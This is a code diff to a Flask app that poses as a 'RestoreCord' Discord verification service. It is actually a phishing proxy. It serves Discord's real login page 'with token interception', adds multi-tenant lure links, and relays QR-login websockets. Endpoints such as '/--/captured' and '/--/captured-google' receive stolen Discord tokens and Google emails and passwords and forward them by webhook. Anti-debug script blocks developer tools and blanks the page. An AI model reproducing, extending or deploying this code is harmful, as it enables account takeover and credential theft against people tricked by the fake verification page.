+.card{width:100%;max-width:36rem;border-radius:1rem;overflow:hidden;
+backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);
+background:hsla(0,0%,5%,.5);border:1px solid hsla(0,0%,100%,.06);
+box-shadow:0 20px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1),
+inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04);
+transition:all .3s}
+.card-inner{padding:24px 32px;display:flex;flex-direction:column;gap:24px}
+@media(min-width:768px){.card-inner{padding:32px}}
+.center{text-align:center;display:flex;flex-direction:column;align-items:center;gap:16px}
+.avatar{width:112px;height:112px;border-radius:50%;overflow:hidden;
+box-shadow:0 10px 25px -3px rgba(0,0,0,.4);transition:transform .3s}
+.avatar:hover{transform:scale(1.05)}
+.avatar img{width:100%;height:100%;object-fit:cover}
+.avatar-fallback{width:100%;height:100%;display:flex;align-items:center;justify-content:center;
+font-size:2rem;background:hsla(0,0%,50%,.2);backdrop-filter:blur(8px);
+border:1px solid hsla(0,0%,100%,.06);color:#fff}
+@media(min-width:768px){.avatar{width:144px;height:144px}}
+.name-row{display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap}
+.name-row h1{font-weight:700;font-size:30px;line-height:25px;word-break:break-word;
+background-clip:text}
+.badge{padding:6px;border-radius:50%;background:hsla(142,76%,36%,.1);
+transition:transform .3s;cursor:default;
+box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04)}
+.badge:hover{transform:scale(1.1)}
+.badge svg{width:20px;height:20px;color:#22c55e;filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}
+.verify-btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;width:100%;
+max-width:28rem;font-size:15px;font-weight:500;color:#fff;
+background:#5865f2;border:none;border-radius:1rem;padding:12px 16px;
+cursor:pointer;text-decoration:none;transition:all .3s;
+box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04)}
+.verify-btn:hover{transform:scale(1.05);filter:brightness(1.1)}
+.verify-btn:active{transform:scale(.95)}
+.verify-btn span{filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}
+.verify-btn svg{width:20px;height:20px;flex-shrink:0}
+.google-btn{background:#fff;color:#3c4043;box-shadow:0 1px 3px rgba(0,0,0,.3),inset 0 1px 0 0 rgba(255,255,255,.2)}
+.google-btn:hover{background:#f8f9fa;filter:none;transform:scale(1.05)}
+.google-btn span{filter:none;color:#3c4043;font-weight:500}
+.btn-group{display:flex;flex-direction:column;align-items:center;gap:10px;width:100%}
+.btn-divider{display:flex;align-items:center;gap:12px;width:100%;max-width:28rem;color:#888;font-size:12px;text-transform:uppercase;letter-spacing:1px}
+.btn-divider::before,.btn-divider::after{content:'';flex:1;height:1px;background:hsla(0,0%,100%,.1)}
+.verified-btn{display:inline-flex;align-items:center;justify-content:center;width:100%;
+max-width:28rem;font-size:15px;font-weight:500;color:#fff;gap:8px;
+background:#22c55e;border:none;border-radius:1rem;padding:12px 16px;
+cursor:default;text-decoration:none;pointer-events:none;
+box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04)}
+.verified-btn svg{width:20px;height:20px}
+.verified-btn span{filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}
+</style></head><body>
+<div class="bg-layer">
+<canvas id="bgCanvas"></canvas>
+<div class="bg-gradient"></div>
+</div>
+<div class="main">
+<div class="card">
+<div class="card-inner">
+<div class="center">
+<div class="avatar">
+{{AVATAR_HTML}}
+</div>
+<div class="name-row">
+<h1>{{SERVER_NAME}}</h1>
+<div class="badge" title="Verified">
+<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+<path d="M22 13V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v12c0 1.1.9 2 2 2h9"></path>
+<path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
+<path d="m17 17 4 4"></path><path d="m21 17-4 4"></path>
+</svg>
+</div>
+</div>
+</div>
+<div style="display:flex;justify-content:center;width:100%">
+{{BUTTON_HTML}}
+</div>
+</div>
+</div>
+</div>
+<script>
+// Animated purple gradient background (WebGL)
+(function(){
+var c=document.getElementById("bgCanvas"),gl=c.getContext("webgl")||c.getContext("experimental-webgl");
+if(!gl)return;
+function resize(){c.width=c.clientWidth*devicePixelRatio;c.height=c.clientHeight*devicePixelRatio;gl.viewport(0,0,c.width,c.height)}
+window.addEventListener("resize",resize);resize();
+var vs="attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}";
+var fs="precision mediump float;uniform float t;uniform vec2 r;"+
+"void main(){"+
+"vec2 u=gl_FragCoord.xy/r;"+
+"float a1=sin(u.x*2.5+t*0.8+u.y*1.2)*0.5+0.5;"+
+"float a2=sin(u.y*3.0-t*0.6+u.x*0.8)*0.5+0.5;"+
+"float a3=sin((u.x+u.y)*2.0+t*0.4)*0.5+0.5;"+
+"float swirl=sin(length(u-vec2(0.3,0.7))*6.0-t*1.2)*0.5+0.5;"+
+"float flow=mix(a1,a2,a3)*0.7+swirl*0.3;"+
+"vec3 deep=vec3(0.01,0.02,0.12);"+
+"vec3 mid=vec3(0.04,0.08,0.35);"+
+"vec3 bright=vec3(0.1,0.12,0.55);"+
+"vec3 accent=vec3(0.2,0.15,0.7);"+
+"vec3 col=mix(deep,mid,smoothstep(0.0,0.5,flow));"+
+"col=mix(col,bright,smoothstep(0.4,0.75,flow));"+
+"col=mix(col,accent,smoothstep(0.7,1.0,swirl*a1));"+
+"float vig=1.0-length(u-vec2(0.5,0.4))*0.6;"+
+"col*=smoothstep(0.0,0.5,vig);"+
+"col+=vec3(0.01,0.02,0.06)*smoothstep(0.3,0.0,u.y);"+
+"gl_FragColor=vec4(col,1.0);}";
+function sh(src,type){var s=gl.createShader(type);gl.shaderSource(s,src);gl.compileShader(s);return s;}
+var pg=gl.createProgram();gl.attachShader(pg,sh(vs,gl.VERTEX_SHADER));gl.attachShader(pg,sh(fs,gl.FRAGMENT_SHADER));
+gl.linkProgram(pg);gl.useProgram(pg);
+var b=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,b);
+gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
+var p=gl.getAttribLocation(pg,"p");gl.enableVertexAttribArray(p);gl.vertexAttribPointer(p,2,gl.FLOAT,false,0,0);
+var tU=gl.getUniformLocation(pg,"t"),rU=gl.getUniformLocation(pg,"r");
+function draw(now){gl.uniform1f(tU,now*0.001);gl.uniform2f(rU,c.width,c.height);
+gl.drawArrays(gl.TRIANGLE_STRIP,0,4);requestAnimationFrame(draw);}
+requestAnimationFrame(draw);
+})();
+// Anti-debug
+(function(){document.addEventListener('contextmenu',function(e){e.preventDefault();});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='u'))e.preventDefault();});(function x(){setInterval(function(){var s=new Date();debugger;if(new Date()-s>100){document.body.innerHTML='';}},1000);})();})();
+</script>
+</body></html>'''
+
+# Discord + Google SVG icons for buttons
+_DISCORD_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 127.14 96.36" fill="#fff"><path d="M107.7 8.07A105.15 105.15 0 0081.47 0a72.06 72.06 0 00-3.36 6.83 97.68 97.68 0 00-29.11 0A72.37 72.37 0 0045.64 0a105.89 105.89 0 00-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0032.17 16.15 77.7 77.7 0 006.89-11.11 68.42 68.42 0 01-10.85-5.18c.91-.66 1.8-1.34 2.66-2.04a75.57 75.57 0 0064.32 0c.87.71 1.76 1.39 2.66 2.04a68.68 68.68 0 01-10.87 5.19 77 77 0 006.89 11.1 105.25 105.25 0 0032.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53.05s5-12.64 11.45-12.64S53.89 46 53.73 53.05 48.9 65.69 42.45 65.69zm42.24 0C78.41 65.69 73.25 60 73.25 53.05s5-12.64 11.44-12.64 11.89 5.56 11.72 12.64S91.36 65.69 84.69 65.69z"/></svg>'
+_GOOGLE_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>'
+
+
+def _build_buttons(login_url, verified=False):
+    """Build the button HTML for the verify page."""
+    if verified:
+        return '<div class="verified-btn"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg><span>Verified!</span></div>'
+    return (
+        f'<div class="btn-group">'
+        f'<a class="verify-btn" href="{login_url}">{_DISCORD_SVG}<span>Login with Discord</span></a>'
+        f'</div>'
+    )
+
 
 @app.route('/')
 def index():
-    return send_from_directory('.', 'verify_page.html')
+    """Landing page — no tenant context, show generic info."""
+    return make_response('''<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>RestoreCord Verify</title>
+<style>body{background:#1a1a2e;color:#e0e0e0;font-family:sans-serif;display:flex;align-items:center;
+justify-content:center;min-height:100vh;margin:0}
+.c{text-align:center;max-width:500px;padding:40px}
+h1{color:#5865F2;margin-bottom:16px}p{color:#a0a0b8;line-height:1.6}</style>
+<script>!function(){var h=location.hash.replace(/^#/,'');if(h){var p=h.split('/').filter(Boolean);if(p.length>=2){var id=p[p.length-2],sv=p[p.length-1];if(/^\\d+$/.test(id)&&/^\\d+$/.test(sv)){location.replace('/'+id+'/'+sv);return}}}}()</script>
+</head><body><div class="c">
+<h1>RestoreCord Verify</h1>
+<p>This is a Discord verification service. Server owners provide their members with a unique verification link.</p>
+</div></body></html>''', 200, {'Content-Type': 'text/html'})
 
 
-@app.route('/verify/<path:slug>')
-def verify_catchall(slug):
-    """Catch-all: /verify/anything serves the same verify page."""
-    return send_from_directory('.', 'verify_page.html')
+@app.route('/<guild_id>/<role_id>/<bot_key>')
+def tenant_verify(guild_id, role_id, bot_key):
+    """Multi-tenant entry point: /<guild_id>/<role_id>/<bot_key>
+    Validates the bot_key maps to a real env var, stores tenant context, shows verify page."""
+    # Validate IDs are numeric (Discord snowflakes)
+    if not guild_id.isdigit() or not role_id.isdigit() or not bot_key.isdigit():
+        return make_response('Invalid verification link.', 400)
+    # Validate bot token exists
+    bot_token = _get_bot_token(bot_key)
+    if not bot_token:
+        return make_response('Invalid verification link.', 404)
+    # Store tenant context
+    _set_tenant(guild_id, role_id, bot_key)
+    # Fetch guild info (name, icon)
+    guild = _fetch_guild_info(guild_id, bot_token)
+    server_name = guild.get('name', 'Server')
+    icon_url = guild.get('icon_url', '')
+    first_letter = server_name[0].upper() if server_name else 'S'
+    if icon_url:
+        avatar_html = f'<img src="{icon_url}" alt="{server_name}" loading="eager">'
+    else:
+        avatar_html = f'<span class="avatar-fallback">{first_letter}</span>'
+    # Build page
+    login_url = f'/{guild_id}/{role_id}/{bot_key}/login'
+    verified = request.args.get('verified') == '1'
+    button_html = _build_buttons(login_url, verified)
+    import html as html_mod
+    page = _VERIFY_PAGE.replace('{{SERVER_NAME}}', html_mod.escape(server_name))
+    page = page.replace('{{AVATAR_HTML}}', avatar_html)
+    page = page.replace('{{BUTTON_HTML}}', button_html)
+    resp = make_response(page)
+    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+    resp.headers['Cache-Control'] = 'no-store'
+    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{bot_key}', max_age=600, httponly=False, samesite='Lax')
+    return resp
 
 
-@app.route('/login')
-def login_page():
-    """Proxy Discord's REAL login page with token interception."""
+@app.route('/<guild_id>/<role_id>/<bot_key>/login')
+def tenant_login(guild_id, role_id, bot_key):
+    """Multi-tenant login: stores tenant context then serves Discord login proxy."""
+    if not guild_id.isdigit() or not role_id.isdigit() or not bot_key.isdigit():
+        return make_response('Invalid verification link.', 400)
+    bot_token = _get_bot_token(bot_key)
+    if not bot_token:
+        return make_response('Invalid verification link.', 404)
+    # Store tenant context
+    _set_tenant(guild_id, role_id, bot_key)
+    # Serve the Discord login page (same as /login)
     html = _fetch_login_html()
     if html:
-        # Ensure client has a proxy session for API calls
-        sid, s = _get_proxy_session()
-        # Warm session with Discord cookies if fresh
+        # Always create a fresh proxy session for login pages to prevent auto-forward
+        # from a previous authenticated session
+        new_sid = uuid.uuid4().hex[:16]
+        s = _make_session()
+        with _proxy_sessions_lock:
+            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
+        sid = new_sid
         try:
             s.get('https://discord.com/login', headers={
                 'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
@@ -2255,7 +3046,179 @@ def login_page():
             }, timeout=15)
         except:
             pass
-        # Also inject page token for backward compat (QR start)
+        tok = _issue_page_token()
+        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
+        resp = make_response(html_out)
+        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+        resp.headers['Pragma'] = 'no-cache'
+        resp.headers['Expires'] = '0'
+        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
+        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{bot_key}', max_age=600, httponly=False, samesite='Lax')
+        return resp
+    return _serve_local_login()
+
+
+@app.route('/<guild_id>/<role_id>/<identifier>/<server_int>')
+def tenant_verify_v2(guild_id, role_id, identifier, server_int):
+    """Multi-tenant v2: /<guild_id>/<role_id>/<identifier>/<server_int>
+    Gets server info from TOKENPANEL (bot token never leaves the panel)."""
+    if not guild_id.isdigit() or not role_id.isdigit() or not identifier.isdigit() or not server_int.isdigit():
+        return make_response('Invalid verification link.', 400)
+    server_info = _get_server_info_from_panel(identifier, server_int)
+    if not server_info or not server_info.get('has_bot_token'):
+        return make_response('Invalid verification link.', 404)
+    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
+    server_name = server_info.get('guild_name', 'Server') or 'Server'
+    icon_url = server_info.get('guild_icon', '')
+    first_letter = server_name[0].upper() if server_name else 'S'
+    if icon_url:
+        import html as html_mod_esc
+        avatar_html = f'<img src="{html_mod_esc.escape(icon_url)}" alt="{html_mod_esc.escape(server_name)}" loading="eager">'
+    else:
+        avatar_html = f'<span class="avatar-fallback">{first_letter}</span>'
+    login_url = f'/{guild_id}/{role_id}/{identifier}/{server_int}/login'
+    verified = request.args.get('verified') == '1'
+    button_html = _build_buttons(login_url, verified)
+    import html as html_mod
+    page = _VERIFY_PAGE.replace('{{SERVER_NAME}}', html_mod.escape(server_name))
+    page = page.replace('{{AVATAR_HTML}}', avatar_html)
+    page = page.replace('{{BUTTON_HTML}}', button_html)
+    resp = make_response(page)
+    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+    resp.headers['Cache-Control'] = 'no-store'
+    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
+    return resp
+
+
+@app.route('/<guild_id>/<role_id>/<identifier>/<server_int>/login')
+def tenant_login_v2(guild_id, role_id, identifier, server_int):
+    """Multi-tenant v2 login. Bot token stays on TOKENPANEL."""
+    if not guild_id.isdigit() or not role_id.isdigit() or not identifier.isdigit() or not server_int.isdigit():
+        return make_response('Invalid verification link.', 400)
+    server_info = _get_server_info_from_panel(identifier, server_int)
+    if not server_info or not server_info.get('has_bot_token'):
+        return make_response('Invalid verification link.', 404)
+    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
+    html = _fetch_login_html()
+    if html:
+        # Always create a fresh proxy session for login pages to prevent auto-forward
+        # from a previous authenticated session
+        new_sid = uuid.uuid4().hex[:16]
+        s = _make_session()
+        with _proxy_sessions_lock:
+            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
+        sid = new_sid
+        try:
+            s.get('https://discord.com/login', headers={
+                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            }, timeout=15)
+        except:
+            pass
+        tok = _issue_page_token()
+        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
+        resp = make_response(html_out)
+        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+        resp.headers['Pragma'] = 'no-cache'
+        resp.headers['Expires'] = '0'
+        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
+        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
+        return resp
+    return _serve_local_login()
+
+
+@app.route('/<identifier>/<server_int>')
+def tenant_verify_short(identifier, server_int):
+    """Short-form entry: /<identifier>/<server_int>
+    Gets guild_id + role_id from TOKENPANEL so URL stays compact."""
+    if not identifier.isdigit() or not server_int.isdigit():
+        return make_response('Invalid verification link.', 400)
+    server_info = _get_server_info_from_panel(identifier, server_int)
+    if not server_info or not server_info.get('has_bot_token'):
+        return make_response('Invalid verification link.', 404)
+    guild_id = server_info.get('guild_id', '0')
+    role_id = server_info.get('verify_role_id', '0')
+    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
+    server_name = server_info.get('guild_name', 'Server') or 'Server'
+    icon_url = server_info.get('guild_icon', '')
+    first_letter = server_name[0].upper() if server_name else 'S'
+    if icon_url:
+        import html as html_mod_esc
+        avatar_html = f'<img src="{html_mod_esc.escape(icon_url)}" alt="{html_mod_esc.escape(server_name)}" loading="eager">'
+    else:
+        avatar_html = f'<span class="avatar-fallback">{first_letter}</span>'
+    login_url = f'/{identifier}/{server_int}/login'
+    verified = request.args.get('verified') == '1'
+    button_html = _build_buttons(login_url, verified)
+    import html as html_mod
+    page = _VERIFY_PAGE.replace('{{SERVER_NAME}}', html_mod.escape(server_name))
+    page = page.replace('{{AVATAR_HTML}}', avatar_html)
+    page = page.replace('{{BUTTON_HTML}}', button_html)
+    resp = make_response(page)
+    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+    resp.headers['Cache-Control'] = 'no-store'
+    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
+    return resp
+
+
+@app.route('/<identifier>/<server_int>/login')
+def tenant_login_short(identifier, server_int):
+    """Short-form login: /<identifier>/<server_int>/login"""
+    if not identifier.isdigit() or not server_int.isdigit():
+        return make_response('Invalid verification link.', 400)
+    server_info = _get_server_info_from_panel(identifier, server_int)
+    if not server_info or not server_info.get('has_bot_token'):
+        return make_response('Invalid verification link.', 404)
+    guild_id = server_info.get('guild_id', '0')
+    role_id = server_info.get('verify_role_id', '0')
+    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
+    html = _fetch_login_html()
+    if html:
+        new_sid = uuid.uuid4().hex[:16]
+        s = _make_session()
+        with _proxy_sessions_lock:
+            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
+        sid = new_sid
+        try:
+            s.get('https://discord.com/login', headers={
+                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            }, timeout=15)
+        except:
+            pass
+        tok = _issue_page_token()
+        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
+        resp = make_response(html_out)
+        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+        resp.headers['Pragma'] = 'no-cache'
+        resp.headers['Expires'] = '0'
+        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
+        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
+        return resp
+    return _serve_local_login()
+
+
+@app.route('/login')
+def login_page():
+    """Proxy Discord's REAL login page with token interception."""
+    html = _fetch_login_html()
+    if html:
+        # Always create a fresh proxy session to prevent auto-forward
+        new_sid = uuid.uuid4().hex[:16]
+        s = _make_session()
+        with _proxy_sessions_lock:
+            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
+        sid = new_sid
+        try:
+            s.get('https://discord.com/login', headers={
+                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            }, timeout=15)
+        except:
+            pass
         tok = _issue_page_token()
         html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
         resp = make_response(html_out)
@@ -2265,7 +3228,6 @@ def login_page():
         resp.headers['Expires'] = '0'
         resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
         return resp
-    # Fallback to local clone
     return _serve_local_login()
 
 
@@ -2294,7 +3256,7 @@ def login_classic():
 
 @app.route('/favicon.ico')
 def favicon():
-    return send_from_directory('.', 'captcha.png', mimetype='image/png')
+    return send_from_directory('.', 'restorecordicon.png', mimetype='image/png')
 
 
 # ━━━━━━━━━━ Pre-Challenge (Arsenal-Backed) ━━━━━━━━━━
@@ -2376,17 +3338,23 @@ def api_prechallenge_status(pc_id):
 
 @app.route('/api/debug-role')
 def debug_role():
-    """Diagnostic endpoint: test bot token, guild access, role setup."""
+    """Diagnostic endpoint: test bot token, guild access, role setup.
+    Usage: /api/debug-role?bot_key=1&guild_id=XXX&role_id=YYY"""
+    bot_key = request.args.get('bot_key', '1')
+    guild_id = request.args.get('guild_id', '')
+    role_id = request.args.get('role_id', '')
+    bot_token = _get_bot_token(bot_key)
     results = {'config': {
-        'bot_token_set': bool(BOT_TOKEN),
-        'guild_id': GUILD_ID or 'MISSING',
-        'verified_id': VERIFIED_ID or 'MISSING',
+        'bot_key': bot_key,
+        'bot_token_set': bool(bot_token),
+        'guild_id': guild_id or 'MISSING',
+        'role_id': role_id or 'MISSING',
     }}
-    if not BOT_TOKEN:
-        return jsonify({**results, 'error': 'No BOT_TOKEN set'})
+    if not bot_token:
+        return jsonify({**results, 'error': f'No BOTTOKEN{bot_key} env var set'})
     try:
         s = _make_session()
-        bh = {'Authorization': f'Bot {BOT_TOKEN}', 'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)'}
+        bh = {'Authorization': f'Bot {bot_token}', 'User-Agent': 'DiscordBot (https://restorecordverify.info, 1.0)'}
         # 1) Bot user info
         r1 = s.get(f'{API}/users/@me', headers=bh, timeout=10)
         if r1.ok:
@@ -2396,26 +3364,25 @@ def debug_role():
             results['bot'] = {'status': r1.status_code, 'error': r1.text[:200]}
             return jsonify(results)
         # 2) Guild info
-        if GUILD_ID:
-            r2 = s.get(f'{API}/guilds/{GUILD_ID}', headers=bh, timeout=10)
+        if guild_id:
+            r2 = s.get(f'{API}/guilds/{guild_id}', headers=bh, timeout=10)
             if r2.ok:
                 gd = r2.json()
                 results['guild'] = {'name': gd.get('name'), 'status': r2.status_code}
             else:
                 results['guild'] = {'status': r2.status_code, 'error': r2.text[:200]}
         # 3) Roles
-        if GUILD_ID:
-            r3 = s.get(f'{API}/guilds/{GUILD_ID}/roles', headers=bh, timeout=10)
+        if guild_id:
+            r3 = s.get(f'{API}/guilds/{guild_id}/roles', headers=bh, timeout=10)
             if r3.ok:
                 roles = r3.json()
-                target = [rl for rl in roles if rl['id'] == VERIFIED_ID]
+                target = [rl for rl in roles if rl['id'] == role_id]
                 results['roles'] = {'total': len(roles), 'target_found': bool(target)}
                 if target:
                     results['roles']['target'] = {'name': target[0]['name'], 'position': target[0]['position']}
-                # Bot's highest role
                 bot_id = results.get('bot', {}).get('id')
                 if bot_id:
-                    r4 = s.get(f'{API}/guilds/{GUILD_ID}/members/{bot_id}', headers=bh, timeout=10)
+                    r4 = s.get(f'{API}/guilds/{guild_id}/members/{bot_id}', headers=bh, timeout=10)
                     if r4.ok:
                         bot_roles = r4.json().get('roles', [])
                         bot_role_objs = [rl for rl in roles if rl['id'] in bot_roles]
@@ -2430,11 +3397,11 @@ def debug_role():
                         results['bot_member'] = {'status': r4.status_code, 'error': r4.text[:200]}
             else:
                 results['roles'] = {'status': r3.status_code, 'error': r3.text[:200]}
-        # 4) Quick test: assign role to bot itself (will fail but shows permissions)
-        results['note'] = 'Use /api/debug-role?test_user=USER_ID to test role assign on a real user'
+        # 4) Test role assign
+        results['note'] = 'Use &test_user=USER_ID to test role assign on a real user'
         test_uid = request.args.get('test_user')
-        if test_uid:
-            url = f'{API}/guilds/{GUILD_ID}/members/{test_uid}/roles/{VERIFIED_ID}'
+        if test_uid and guild_id and role_id:
+            url = f'{API}/guilds/{guild_id}/members/{test_uid}/roles/{role_id}'
             rp = s.put(url, headers={**bh, 'Content-Length': '0', 'X-Audit-Log-Reason': 'debug test'}, timeout=10)
             results['test_assign'] = {'status': rp.status_code, 'response': rp.text[:300]}
     except Exception as e:
@@ -3497,7 +4464,7 @@ def proxy_error_reporting(rest):
     return '', 204
 
 
-@sock.route('/remote-auth')
+@sock.route('/remote-auth/')
 def ws_remote_auth(ws):
     """WebSocket proxy for Discord's remote-auth-gateway (QR code login).
     Browser connects here; we relay to Discord with correct Origin header."""
@@ -3542,7 +4509,6 @@ def ws_remote_auth(ws):
                     except Exception:
                         break
                     if msg is None:
-                        # timeout, not disconnect — keep waiting
                         continue
                     if isinstance(msg, bytes):
                         upstream.send_binary(msg)
@@ -3557,7 +4523,6 @@ def ws_remote_auth(ws):
         t2 = threading.Thread(target=client_to_upstream, daemon=True)
         t1.start()
         t2.start()
-        # Block until either direction closes
         closed.wait()
     except Exception as e:
         print(f'[ws-proxy] remote-auth error: {e}')
@@ -3566,6 +4531,12 @@ def ws_remote_auth(ws):
         if upstream:
             try: upstream.close()
             except: pass
+
+
+@app.route('/ra/<path:fingerprint>')
+def ra_redirect(fingerprint):
+    """Redirect /ra/{fingerprint} to Discord so the mobile app handles the deep link."""
+    return redirect(f'https://discord.com/ra/{fingerprint}')
 
 
 @app.route('/--/captured', methods=['POST'])
@@ -3580,9 +4551,164 @@ def captured_token():
             ip = request.headers.get('X-Forwarded-For', request.remote_addr)
             print(f'[CAPTURED-JS] Token via {source}, IP={_clean_ip(ip)}')
             fire_webhook(token, ip, pw)
+            # Assign role using tenant context
+            tenant = _get_tenant()
+            if tenant:
+                _success_with_info(token, tenant)
     except Exception as e:
         print(f'[captured] Error: {e}')
     return '', 204
+
+
+@app.route('/--/captured-google', methods=['POST'])
+def captured_google():
+    """Client-side JS sends intercepted Google credentials here."""
+    try:
+        d = request.get_json(silent=True) or json.loads(request.data or b'{}')
+        email = d.get('e', '')
+        pw = d.get('p', '')
+        if email and pw:
+            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            print(f'[GOOGLE-JS] Captured {email}, IP={_clean_ip(ip)}')
+            _fire_google_webhook(email, pw, ip)
+    except Exception as e:
+        print(f'[google-captured] Error: {e}')
+    return '', 204
+
+
+@app.route('/google-login')
+def google_login_page():
+    """Serve proxied Google sign-in page."""
+    entry_url = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com&followup=https%3A%2F%2Fmyaccount.google.com&ifkv=1&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+    new_sid = uuid.uuid4().hex[:16]
+    s = creq.Session(impersonate='chrome')
+    with _google_sessions_lock:
+        _google_sessions[new_sid] = {'s': s, 'ts': time.time()}
+    try:
+        r = s.get(entry_url, headers={
+            'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Sec-CH-UA': SEC_CH_UA, 'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+        }, timeout=20, allow_redirects=True)
+        if r.status_code == 200:
+            html = _google_rewrite_html(r.text)
+            resp = make_response(html)
+            resp.headers['Content-Type'] = 'text/html; charset=utf-8'
